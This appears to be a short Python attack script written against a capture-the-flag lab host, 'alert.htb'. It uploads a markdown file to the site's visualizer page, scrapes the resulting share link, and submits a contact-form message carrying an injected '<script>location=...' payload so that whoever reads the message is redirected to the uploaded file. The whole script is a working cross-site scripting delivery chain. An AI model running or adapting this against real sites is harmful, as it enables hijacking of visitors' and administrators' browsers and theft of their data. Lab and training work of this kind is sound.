import threading
import requests
from bs4 import BeautifulSoup
import subprocess
import urllib
url="http://alert.htb"
def send_mess(a):
    email="a@qq.com"
    mes=("<script>location='{}".format(a))
    print(mes)
    r=requests.post(url+"/contact.php",data={"email":email,"message":mes},allow_redirects=False)
    print(r.status_code)
    print(r.text)
with open("a.md","rb") as f:
    res=requests.post(url+"/visualizer.php",files={"file":f}
    )
print(res.text)    
soup=BeautifulSoup(res.text,"html.parser")
a=soup.find_all("a",href=True)[0]["href"]
print(a)
send_mess(a)
